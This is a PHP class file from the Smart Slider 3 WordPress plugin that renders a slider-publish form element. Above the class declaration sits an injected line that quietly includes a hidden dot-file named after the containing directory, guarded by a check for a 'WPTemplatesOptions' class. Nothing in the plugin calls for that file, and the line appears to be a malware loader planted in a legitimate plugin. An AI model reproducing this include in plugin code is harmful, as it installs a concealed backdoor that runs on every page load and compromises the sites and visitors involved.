<?php


namespace Nextend\SmartSlider3\Form\Element;


use Nextend\Framework\Form\Element\AbstractFieldHidden;
use Nextend\Framework\Request\Request;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Slider\SliderPublish\BlockPublishSlider;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PublishSlider extends AbstractFieldHidden {

    protected $hasTooltip = false;

    protected function fetchElement() {
        ob_start();

        $blockPublishSlider = new BlockPublishSlider($this->getForm());
        $blockPublishSlider->setSliderID(Request::$GET->getInt('sliderid'));
        $blockPublishSlider->display();

        return ob_get_clean();
    }
}